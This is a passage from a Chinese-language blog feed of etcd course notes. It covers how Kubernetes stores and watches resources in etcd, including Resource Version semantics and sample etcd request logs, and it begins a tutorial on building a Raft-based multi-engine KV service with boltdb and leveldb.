class="hljs-symbol">:</span><span class="hljs-number">479</span>,<br>    <span class="hljs-string">&quot;response count&quot;</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span>,<br>    <span class="hljs-string">&quot;response size&quot;</span><span class="hljs-symbol">:</span><span class="hljs-number">44</span>,<br>    <span class="hljs-string">&quot;request content&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;compare:&lt;target:MOD key:&quot;</span>/registry/deployments/default/nginx-deployment<span class="hljs-string">&quot; mod_revision:0 &gt; success:&lt;request_put:&lt;key:&quot;</span>/registry/deployments/default/nginx-deployment<span class="hljs-string">&quot; value_size:421 &gt;&gt; failure:&lt;&gt;&quot;</span></span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>从这个请求日志中，你可以得到以下信息：</p><ul><li>请求的模块和接口，KV&#x2F;Txn；</li><li>key路径，&#x2F;registry&#x2F;deployments&#x2F;default&#x2F;nginx-deployment，由prefix + “&#x2F;“ + 资源类型 + “&#x2F;“ + namespace + “&#x2F;“ + 具体资源名组成；</li><li>安全的并发创建检查机制，mod_revision为0时，也就是此key不存在时，才允许执行put更新操作。</li></ul><p>通过Txn接口成功将数据写入到etcd后，kubectl create -f nginx.yml命令就执行完毕，返回给client了。在以上介绍中你可以看到，kube-apiserver并没有任何逻辑去真正创建Pod，但是为什么我们可以马上通过kubectl get命令查询到新建并成功运行的Pod呢？</p><p>这就涉及到了基础架构图中的控制器、调度器、Kubelet等组件。下面我就为你浅析它们是如何基于etcd提供的Watch机制工作，最终实现创建Pod、调度Pod、运行Pod的。</p><h2 id="Watch机制在Kubernetes中应用"><a href="#Watch机制在Kubernetes中应用" class="headerlink" title="Watch机制在Kubernetes中应用"></a>Watch机制在Kubernetes中应用</h2><p>正如基础架构中所介绍的，kube-controller-manager组件中包含一系列WorkLoad的控制器。Deployment资源就由其中的Deployment控制器来负责的，那么它又是如何感知到新建Deployment资源，最终驱动ReplicaSet控制器创建出Pod的呢？</p><p>获取数据变化的方案，主要有轮询和推送两种方案组成。轮询会产生大量expensive request，并且存在高延时。而etcd Watch机制提供的流式推送能力，赋予了kube-apiserver对外提供数据监听能力。</p><p>我们知道在etcd中版本号是个逻辑时钟，随着client对etcd的增、删、改操作而全局递增，它被广泛应用在MVCC、事务、Watch特性中。</p><p>尤其是在Watch特性中，版本号是数据增量同步的核心。当client因网络等异常出现连接闪断后，它就可以通过版本号从etcd server中快速获取异常后的事件，无需全量同步。</p><p>那么在Kubernetes集群中，它提供了什么概念来实现增量监听逻辑呢？</p><p>答案是<strong>Resource Version</strong>。</p><h3 id="Resource-Version与etcd版本号"><a href="#Resource-Version与etcd版本号" class="headerlink" title="Resource Version与etcd版本号"></a>Resource Version与etcd版本号</h3><p>Resource Version是Kubernetes API中非常重要的一个概念，顾名思义，它是一个Kubernetes资源的内部版本字符串，client可通过它来判断资源是否发生了变化。同时，你可以在Get、List、Watch接口中，通过指定Resource Version值来满足你对数据一致性、高性能等诉求。</p><p>那么Resource Version有哪些值呢？跟etcd版本号是什么关系？</p><p>下面我分别以Get和Watch接口中的Resource Version参数值为例，为你剖析它与etcd的关系。</p><p>在Get请求查询案例中，ResourceVersion主要有以下这三种取值：</p><p>第一种是未指定ResourceVersion，默认空字符串。kube-apiserver收到一个此类型的读请求后，它会向etcd发出共识读&#x2F;线性读请求获取etcd集群最新的数据。</p><p>第二种是设置ResourceVersion&#x3D;”0”，赋值字符串0。kube-apiserver收到此类请求时，它可能会返回任意资源版本号的数据，但是优先返回较新版本。一般情况下它直接从kube-apiserver缓存中获取数据返回给client，有可能读到过期的数据，适用于对数据一致性要求不高的场景。</p><p>第三种是设置ResourceVersion为一个非0的字符串。kube-apiserver收到此类请求时，它会保证Cache中的最新ResourceVersion大于等于你传入的ResourceVersion，然后从Cache中查找你请求的资源对象key，返回数据给client。基本原理是kube-apiserver为各个核心资源（如Pod）维护了一个Cache，通过etcd的Watch机制来实时更新Cache。当你的Get请求中携带了非0的ResourceVersion，它会等待缓存中最新ResourceVersion大于等于你Get请求中的ResoureVersion，若满足条件则从Cache中查询数据，返回给client。若不满足条件，它最多等待3秒，若超过3秒，Cache中的最新ResourceVersion还小于Get请求中的ResourceVersion，就会返回ResourceVersionTooLarge错误给client。</p><p>你要注意的是，若你使用的Get接口，那么kube-apiserver会取资源key的ModRevision字段填充Kubernetes资源的ResourceVersion字段（v1.meta&#x2F;ObjectMeta.ResourceVersion）。若你使用的是List接口，kube-apiserver会在查询时，使用etcd当前版本号填充ListMeta.ResourceVersion字段（v1.meta&#x2F;ListMeta.ResourceVersion）。</p><p>那么当我们执行kubectl get po查询案例时，它的ResouceVersion是什么取值呢? 查询的是kube-apiserver缓存还是etcd最新共识数据?</p><p>如下所示，可以通过指定kubectl日志级别为6，观察它向kube-apiserver发出的请求参数。从下面请求日志里你可以看到，默认是未指定Resource Version，也就是会发出一个共识读&#x2F;线性读请求给etcd，获取etcd最新共识数据。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">kubectl get po -l app=nginx -v <span class="hljs-number">6</span><br><span class="hljs-number">4410</span> <span class="hljs-symbol">loader.go:</span><span class="hljs-number">359</span>] <span class="hljs-title class_">Config</span> loaded from file /root/.kube/config<br><span class="hljs-number">4410</span> <span class="hljs-symbol">round_trippers.go:</span><span class="hljs-number">438</span>] <span class="hljs-title class_">GET</span> <span class="hljs-symbol">https:</span>//*.*.*.*<span class="hljs-symbol">:*/api/v1/namespaces/default/pods?labelSelector=app%</span><span class="hljs-number">3</span>Dnginx&amp;limit=<span class="hljs-number">500</span> <span class="hljs-number">200</span> <span class="hljs-title class_">OK</span> <span class="hljs-keyword">in</span> <span class="hljs-number">8</span> milliseconds<br><br></code></pre></td></tr></table></figure><p>这里需要注意，在规模较大的集群中，尽量不要使用kubectl频繁查询资源。正如上面所分析的，它会直接查询etcd数据，可能会产生大量的expensive request请求，之前我就有见过业务这样用，然后导致了集群不稳定。</p><p>介绍完查询案例后，我们再看看Watch案例中，它的不同取值含义是怎样的呢?</p><p>它同样含有查询案例中的三种取值，官方定义的含义分别如下：</p><ul><li>未指定ResourceVersion，默认空字符串。一方面为了帮助client建立初始状态，它会将当前已存在的资源通过Add事件返回给client。另一方面，它会从etcd当前版本号开始监听，后续新增写请求导致数据变化时可及时推送给client。</li><li>设置ResourceVersion&#x3D;”0”，赋值字符串0。它同样会帮助client建立初始状态，但是它会从任意版本号开始监听（当前kube-apiserver的实现指定ResourceVersion&#x3D;0和不指定行为一致，在获取初始状态后，都会从cache最新的ResourceVersion开始监听），这种场景可能会导致集群返回陈旧的数据。</li><li>设置ResourceVersion为一个非0的字符串。从精确的版本号开始监听数据，它只会返回大于等于精确版本号的变更事件。</li></ul><p>Kubernetes的控制器组件就基于以上的Watch特性，在快速感知到新建Deployment资源后，进入一致性协调逻辑，创建ReplicaSet控制器，整体交互流程如下所示。</p><p><img src="https://static001.geekbang.org/resource/image/89/54/89c610a5e5bc2bf5eda466a5a0e18e54.png?wh=1740*1456" alt="img"></p><p>Deployment控制器创建ReplicaSet资源对象的日志如下所示。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs elixir">&#123;<br>    <span class="hljs-string">&quot;level&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;debug&quot;</span></span>,<br>    <span class="hljs-string">&quot;ts&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;2021-02-11T09:55:45.923+0800&quot;</span></span>,<br>    <span class="hljs-string">&quot;caller&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;v3rpc/interceptor.go:181&quot;</span></span>,<br>    <span class="hljs-string">&quot;msg&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;request stats&quot;</span></span>,<br>    <span class="hljs-string">&quot;start time&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;2021-02-11T09:55:45.917+0800&quot;</span></span>,<br>    <span class="hljs-string">&quot;time spent&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;5.922089ms&quot;</span></span>,<br>    <span class="hljs-string">&quot;remote&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;127.0.0.1:44828&quot;</span></span>,<br>    <span class="hljs-string">&quot;response type&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;/etcdserverpb.KV/Txn&quot;</span></span>,<br>    <span class="hljs-string">&quot;request count&quot;</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span>,<br>    <span class="hljs-string">&quot;request size&quot;</span><span class="hljs-symbol">:</span><span class="hljs-number">766</span>,<br>    <span class="hljs-string">&quot;response count&quot;</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span>,<br>    <span class="hljs-string">&quot;response size&quot;</span><span class="hljs-symbol">:</span><span class="hljs-number">44</span>,<br>    <span class="hljs-string">&quot;request content&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;compare:&lt;target:MOD key:&quot;</span>/registry/replicasets/default/nginx-deployment-</span><span class="hljs-number">756</span>d9fd5f9<span class="hljs-string">&quot; mod_revision:0 &gt; success:&lt;request_put:&lt;key:&quot;</span>/registry/replicasets/default/nginx-deployment<span class="hljs-number">-756</span>d9fd5f9<span class="hljs-string">&quot; value_size:697 &gt;&gt; failure:&lt;&gt;&quot;</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>真正创建Pod则是由ReplicaSet控制器负责，它同样基于Watch机制感知到新的RS资源创建后，发起请求创建Pod，确保实际运行Pod数与期望一致。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs elixir">&#123;<br>    <span class="hljs-string">&quot;level&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;debug&quot;</span></span>,<br>    <span class="hljs-string">&quot;ts&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;2021-02-11T09:55:46.023+0800&quot;</span></span>,<br>    <span class="hljs-string">&quot;caller&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;v3rpc/interceptor.go:181&quot;</span></span>,<br>    <span class="hljs-string">&quot;msg&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;request stats&quot;</span></span>,<br>    <span class="hljs-string">&quot;start time&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;2021-02-11T09:55:46.019+0800&quot;</span></span>,<br>    <span class="hljs-string">&quot;time spent&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;3.519326ms&quot;</span></span>,<br>    <span class="hljs-string">&quot;remote&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;127.0.0.1:44664&quot;</span></span>,<br>    <span class="hljs-string">&quot;response type&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;/etcdserverpb.KV/Txn&quot;</span></span>,<br>    <span class="hljs-string">&quot;request count&quot;</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span>,<br>    <span class="hljs-string">&quot;request size&quot;</span><span class="hljs-symbol">:</span><span class="hljs-number">822</span>,<br>    <span class="hljs-string">&quot;response count&quot;</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span>,<br>    <span class="hljs-string">&quot;response size&quot;</span><span class="hljs-symbol">:</span><span class="hljs-number">44</span>,<br>    <span class="hljs-string">&quot;request content&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;compare:&lt;target:MOD key:&quot;</span>/registry/pods/default/nginx-deployment-</span><span class="hljs-number">756</span>d9fd5f9-x6r6q<span class="hljs-string">&quot; mod_revision:0 &gt; success:&lt;request_put:&lt;key:&quot;</span>/registry/pods/default/nginx-deployment<span class="hljs-number">-756</span>d9fd5f9-x6r6q<span class="hljs-string">&quot; value_size:754 &gt;&gt; failure:&lt;&gt;&quot;</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>在这过程中也产生了若干Event，下面是etcd收到新增Events资源的请求，你可以看到Event事件key关联了Lease，这个Lease正是由我上面所介绍的leaseManager所负责创建。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs elixir">&#123;<br>    <span class="hljs-string">&quot;level&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;debug&quot;</span></span>,<br>    <span class="hljs-string">&quot;ts&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;2021-02-11T09:55:45.930+0800&quot;</span></span>,<br>    <span class="hljs-string">&quot;caller&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;v3rpc/interceptor.go:181&quot;</span></span>,<br>    <span class="hljs-string">&quot;msg&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;request stats&quot;</span></span>,<br>    <span class="hljs-string">&quot;start time&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;2021-02-11T09:55:45.926+0800&quot;</span></span>,<br>    <span class="hljs-string">&quot;time spent&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;3.259966ms&quot;</span></span>,<br>    <span class="hljs-string">&quot;remote&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;127.0.0.1:44632&quot;</span></span>,<br>    <span class="hljs-string">&quot;response type&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;/etcdserverpb.KV/Txn&quot;</span></span>,<br>    <span class="hljs-string">&quot;request count&quot;</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span>,<br>    <span class="hljs-string">&quot;request size&quot;</span><span class="hljs-symbol">:</span><span class="hljs-number">449</span>,<br>    <span class="hljs-string">&quot;response count&quot;</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span>,<br>    <span class="hljs-string">&quot;response size&quot;</span><span class="hljs-symbol">:</span><span class="hljs-number">44</span>,<br>    <span class="hljs-string">&quot;request content&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;compare:&lt;target:MOD key:&quot;</span>/registry/events/default/nginx-deployment</span>.<span class="hljs-number">16628</span>eb9f79e0ab0<span class="hljs-string">&quot; mod_revision:0 &gt; success:&lt;request_put:&lt;key:&quot;</span>/registry/events/default/nginx-deployment.<span class="hljs-number">16628</span>eb9f79e0ab0<span class="hljs-string">&quot; value_size:369 lease:5772338802590698925 &gt;&gt; failure:&lt;&gt;&quot;</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>Pod创建出来后，这时kube-scheduler监听到待调度的Pod，于是为其分配Node，通过kube-apiserver的Bind接口，将调度后的节点IP绑定到Pod资源上。kubelet通过同样的Watch机制感知到新建的Pod后，发起Pod创建流程即可。</p><p>以上就是当我们在Kubernetes集群中创建一个Pod后，Kubernetes和etcd之间交互的简要分析。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>最后首先解读了Kubernetes集群的etcd存储格式，每个资源的保存路径为prefix + “&#x2F;“ + 资源类型 + “&#x2F;“ + namespace + “&#x2F;“ + 具体资源名组成。结合etcd3的范围查询，可快速实现按namesapace、资源名称查询。按标签查询则是通过kube-apiserver遍历指定namespace下的资源实现的，若未从kube-apiserver的Cache中查询，请求较频繁，很可能导致etcd流量较大，出现不稳定。</p><p>随后介绍了kube-apiserver的通用存储模块，它通过在创建、查询、删除、更新操作前增加一系列的Hook机制，实现了新增任意资源只需编写相应的Hook策略即可。我还重点和你介绍了创建接口，它主要由拼接key、获取Lease ID、数据转换、写入etcd组成，重点是它通过使用事务接口实现了资源的安全创建及更新。</p><p>最后讲解了Resoure Version在Kubernetes集群中的大量应用，重点分析了Get和Watch请求案例中的Resource Version含义，帮助你了解Resource Version本质，让你能根据业务场景和对一致性的容忍度，正确的使用Resource Version以满足业务诉求。</p><h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><p>有哪些原因可能会导致kube-apiserver报“too old Resource Version”错误呢？</p><p>informer watch请求的resource version比kube-apiserver缓存中保存的最小resource version还小，kube-apiserver就会返回“too old Resource Version”，然后触发informer进行list全量数据，导致expensive request</p>]]></content>
    
    
    <categories>
      
      <category>etcd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>Kubernetes</tag>
      
      <tag>etcd</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>18.实战：如何基于Raft从0到1构建一个支持多存储引擎分布式KV服务？</title>
    <link href="/2022/10/12/18-%E5%AE%9E%E6%88%98%EF%BC%9A%E5%A6%82%E4%BD%95%E5%9F%BA%E4%BA%8ERaft%E4%BB%8E0%E5%88%B01%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%94%AF%E6%8C%81%E5%A4%9A%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E%E5%88%86%E5%B8%83%E5%BC%8FKV%E6%9C%8D%E5%8A%A1%EF%BC%9F/"/>
    <url>/2022/10/12/18-%E5%AE%9E%E6%88%98%EF%BC%9A%E5%A6%82%E4%BD%95%E5%9F%BA%E4%BA%8ERaft%E4%BB%8E0%E5%88%B01%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%94%AF%E6%8C%81%E5%A4%9A%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E%E5%88%86%E5%B8%83%E5%BC%8FKV%E6%9C%8D%E5%8A%A1%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="18-实战：如何基于Raft从0到1构建一个支持多存储引擎分布式KV服务？"><a href="#18-实战：如何基于Raft从0到1构建一个支持多存储引擎分布式KV服务？" class="headerlink" title="18.实战：如何基于Raft从0到1构建一个支持多存储引擎分布式KV服务？"></a>18.实战：如何基于Raft从0到1构建一个支持多存储引擎分布式KV服务？</h1><blockquote><p>本文笔记来自：「极客时间ETCD实战课」，原文链接：<a href="https://time.geekbang.org/column/article/354292?cid=100069901">https://time.geekbang.org/column/article/354292?cid=100069901</a></p></blockquote><p>今天聊聊如何实现一个类etcd、支持多存储引擎的KV服务，基于etcd自带的 <a href="https://github.com/etcd-io/etcd/tree/v3.4.9/contrib/raftexample">raftexample</a> 项目快速构建它。</p><p>为了方便后面描述，把它命名为metcd（表示微型的etcd），它是raftexample的加强版。希望通过metcd这个小小的实战项目，能够帮助进一步理解etcd乃至分布式存储服务的核心架构、原理、典型问题解决方案。</p><h2 id="整体架构设计"><a href="#整体架构设计" class="headerlink" title="整体架构设计"></a>整体架构设计</h2><p>在和你深入聊代码细节之前，首先我和你从整体上介绍下系统架构。</p><p>下面是我给你画的metcd整体架构设计，它由API层、Raft层的共识模块、逻辑层及存储层组成的状态机组成。</p><p>接下来，简要分析下API设计及复制状态机。</p><p><img src="https://static001.geekbang.org/resource/image/5e/03/5e9f6882a6f6e357e5c2c5yyffda4e03.png?wh=1920*1166" alt="img"></p><h3 id="API设计"><a href="#API设计" class="headerlink" title="API设计"></a>API设计</h3><p>API是软件系统对外的语言，它是应用编程接口的缩写，由一组接口定义和协议组成。</p><p>在设计API的时候，往往会考虑以下几个因素：</p><ul><li><strong>性能</strong>。如etcd v2使用的是简单的HTTP&#x2F;1.x，性能上无法满足大规模Kubernetes集群等场景的诉求，因此etcd v3使用的是基于HTTP&#x2F;2的gRPC协议。</li><li><strong>易用性、可调试性</strong>。如有的内部高并发服务为了满足性能等诉求，使用的是UDP协议。相比HTTP协议，UDP协议显然在易用性、可调试性上存在一定的差距。</li><li><strong>开发效率、跨平台、可移植性</strong>。相比基于裸UDP、TCP协议设计的接口，如果你使用Protobuf等IDL语言，它支持跨平台、代码自动自动生成，开发效率更高。</li><li><strong>安全性</strong>。如相比HTTP协议，使用HTTPS协议可对通信数据加密更安全，可适用于不安全的网络环境（比如公网传输）。</li><li><strong>接口幂等性</strong>。幂等性简单来说，就是同样一个接口请求一次与多次的效果一样。若你的接口对外保证幂等性，则可降低使用者的复杂度。</li></ul><p>因为我们场景的是POC(Proof of concept)、Demo开发，因此在metcd项目中，我们优先考虑点是易用性、可调试性，选择HTTP&#x2F;1.x协议，接口上为了满足key-value操作，支持Get和Put接口即可。</p><p>假设metcd项目使用3379端口，Put和Get接口，如下所示。</p><ul><li>Put接口，设置key-value</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -L http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">3379</span>/hello -XPUT -d world<br><br></code></pre></td></tr></table></figure><ul><li>Get接口，查询key-value</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -L http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">3379</span>/hello<br>world<br><br></code></pre></td></tr></table></figure><h3 id="复制状态机"><a href="#复制状态机" class="headerlink" title="复制状态机"></a>复制状态机</h3><p>了解完API设计，那最核心的复制状态机是如何工作的呢？</p><p>我们知道etcd是基于下图复制状态机实现的分布式KV服务，复制状态机由共识模块、日志模块、状态机组成。</p><p><img src="https://static001.geekbang.org/resource/image/5c/4f/5c7a3079032f90120a6b309ee401fc4f.png?wh=605*319" alt="img"></p><p>实战项目metcd，也正是使用与之一样的模型，并且使用etcd项目中实现的Raft算法库作为共识模块，此算法库已被广泛应用在etcd、cockroachdb、dgraph等开源项目中。</p><p>以下是复制状态机的写请求流程：</p><ul><li>client发起一个写请求（put hello &#x3D; world）；</li><li>server向Raft共识模块提交请求，共识模块生成一个写提案日志条目。若server是Leader，则把日志条目广播给其他节点，并持久化日志条目到WAL中；</li><li>当一半以上节点持久化日志条目后，Leader的共识模块将此日志条目标记为已提交（committed），并通知其他节点提交；</li><li>server从共识模块获取已经提交的日志条目，异步应用到状态机存储中（boltdb&#x2F;leveldb&#x2F;memory），然后返回给client。</li></ul><h3 id="多存储引擎"><a href="#多存储引擎" class="headerlink" title="多存储引擎"></a>多存储引擎</h3><p>了解完复制状态机模型后，再深入介绍下状态机。状态机中最核心模块当然是存储引擎，那要如何同时支持多种存储引擎呢？</p><p>metcd项目将基于etcd本身自带的raftexample项目进行快速开发，而raftexample本身只支持内存存储。</p><p>因此通过将KV存储接口进行<strong>抽象化设计</strong>，实现支持多存储引擎。KVStore interface的定义如下所示。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">type</span> KVStore interface &#123;<br>   <span class="hljs-comment">// LookUp get key value</span><br>   <span class="hljs-constructor">Lookup(<span class="hljs-params">key</span> <span class="hljs-params">string</span>)</span> (<span class="hljs-built_in">string</span>, <span class="hljs-built_in">bool</span>)<br><br>   <span class="hljs-comment">// Propose propose kv request into raft state machine</span><br>   <span class="hljs-constructor">Propose(<span class="hljs-params">k</span>, <span class="hljs-params">v</span> <span class="hljs-params">string</span>)</span><br><br>   <span class="hljs-comment">// ReadCommits consume entry from raft state machine into KvStore map until error</span><br>   <span class="hljs-constructor">ReadCommits(<span class="hljs-params">commitC</span> &lt;-<span class="hljs-params">chan</span> <span class="hljs-operator">*</span><span class="hljs-params">string</span>, <span class="hljs-params">errorC</span> &lt;-<span class="hljs-params">chan</span> <span class="hljs-params">error</span>)</span><br><br>   <span class="hljs-comment">// Snapshot return KvStore snapshot</span><br>   <span class="hljs-constructor">Snapshot()</span> (<span class="hljs-literal">[]</span>byte, error)<br><br>   <span class="hljs-comment">// RecoverFromSnapshot recover data from snapshot</span><br>   <span class="hljs-constructor">RecoverFromSnapshot(<span class="hljs-params">snapshot</span> []<span class="hljs-params">byte</span>)</span> error<br><br>   <span class="hljs-comment">// Close close backend databases</span><br>   <span class="hljs-constructor">Close()</span> err<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>基于KV接口抽象化的设计，只需要针对具体的存储引擎，实现对应的操作即可。</strong></p><p>我们期望支持三种存储引擎，分别是内存map、boltdb、leveldb，并做一系列简化设计。一组metcd实例，通过metcd启动时的配置来决定使用哪种存储引擎。不同业务场景不同实例，比如读多写少的存储引擎可使用boltdb，写多读少的可使用leveldb。</p><p>接下来重点介绍下存储引擎的选型及原理。</p><h4 id="boltdb"><a href="#boltdb" class="headerlink" title="boltdb"></a>boltdb</h4><p>boltdb是一个基于B+ tree实现的存储引擎库，在 之前文章详细介绍过原理。</p><p>boltdb为什么适合读多写少？</p><p><strong>对于读请求而言，一般情况下它可直接从内存中基于B+ tree遍历，快速获取数据返回给client，不涉及经过磁盘I&#x2F;O。</strong></p><p>对于写请求，它基于B+ tree查找写入位置，更新key-value。事务提交时，写请求包括B+ tree重平衡、分裂、持久化ditry page、持久化freelist、持久化meta page流程。同时，ditry page可能分布在文件的各个位置，它发起的是随机写磁盘I&#x2F;O。</p><p>因此在boltdb中，完成一个写请求的开销相比读请求是大很多的。一个3节点的8核16G空集群，线性读性能可以达到19万QPS，而写QPS仅为5万。</p><h4 id="leveldb"><a href="#leveldb" class="headerlink" title="leveldb"></a>leveldb</h4><p>那要如何设计适合写多读少的存储引擎呢?</p><p>最简单的思路当然是写内存最快。可是内存有限的，无法支撑大容量的数据存储，不持久化数据会丢失。</p><p>那能否直接将数据顺序追加到文件末尾（AOF）呢？因为磁盘的特点是顺序写性能比较快。</p><p>当然可以。 <a href="https://en.wikipedia.org/wiki/Bitcask">Bitcask</a> 存储模型就是采用AOF模式，把写请求顺序追加到文件。Facebook的图片存储 <a href="https://www.usenix.org/legacy/event/osdi10/tech/full_papers/Beaver.pdf">Haystack</a> 根据其论文介绍，也是使用类似的方案来解决大规模写入痛点。</p><p>那在AOF写入模型中如何实现查询数据呢？</p><p>很显然通过遍历文件一个个匹配key是可以的，但是它的性能是极差的。为了实现高性能的查询，最理想的解决方案从直接从内存中查询，但是内存是有限的，那么我们能否通过内存索引来记录一个key-value数据在文件中的偏移量，实现从磁盘快速读取呢？</p><p>是的，这正是 <a href="https://en.wikipedia.org/wiki/Bitcask">Bitcask</a> 存储模型的查询的实现，它通过内存哈希表维护各个key-value数据的索引，实现了快速查找key-value数据。不过，内存中虽然只保存key索引信息，但是当key较多的时候，其对内存要求依然比较高。</p><p>快速了解完存储引擎提升写性能的核心思路（随机写转化为顺序写）之后，那leveldb它的原理是怎样的呢？与Bitcask存储模型有什么不一样？</p><p>leveldb是基于**LSM tree(log-structured merge-tree)**实现的key-value存储，它的架构如下图所示（ <a href="https://microsoft.github.io/MLOS/notebooks/LevelDbTuning/">引用自微软博客</a>）。</p><p>它提升写性能的核心思路同样是将随机写转化为顺序写磁盘WAL文件和内存，结合了我们上面讨论的写内存和磁盘两种方法。数据持久化到WAL文件是为了确保机器crash后数据不丢失。</p><p><img src="https://static001.geekbang.org/resource/image/05/50/05f01951fe5862a62624b81e2ceea150.png?wh=992*677" alt="img"></p><p>那么它要如何解决内存不足和查询的痛点问题呢？</p><p>核心解决方案是分层的设计和基于一系列对象的转换和压缩。接下来分析一下上面架构图写流程和后台compaction任务：</p><ul><li>首先写请求顺序写入Log文件(WAL)；</li><li>更新内存的Memtable。leveldb Memtable后端数据结构实现是skiplist，skiplist相比平衡二叉树，实现简单却同样拥有高性能的读写；</li><li>当Memtable达到一定的阈值时，转换成不可变的Memtable，也就是只读不可写；</li><li>leveldb后台Compact任务会将不可变的Memtable生成SSTable文件，它有序地存储一系列key-value数据。注意SST文件按写入时间进行了分层，Level层次越小数据越新。Manifest文件记录了各个SSTable文件处于哪个层级、它的最小与最大key范围；</li><li>当某个level下的SSTable文件数目超过一定阈值后，Compact任务会从这个level的SSTable中选择一个文件（level&gt;0），将其和高一层级的level+1的SSTable文件合并；</li><li>注意level 0是由Immutable直接生成的，因此level 0 SSTable文件中的key-value存在相互重叠。而level &gt; 0时，在和更高一层SSTable合并过程中，参与的SSTable文件是多个，leveldb会确保各个SSTable中的key-value不重叠。</li></ul><p>了解完写流程，读流程也就简单了，核心步骤如下：</p><ul><li>从Memtable跳跃表中查询key；</li><li>未找到则从Immutable中查找；</li><li>Immutable仍未命中，则按照leveldb的分层属性，因level 0 SSTable文件是直接从Immutable生成的，level 0存在特殊性，因此你需要从level 0遍历SSTable查找key；</li><li>level 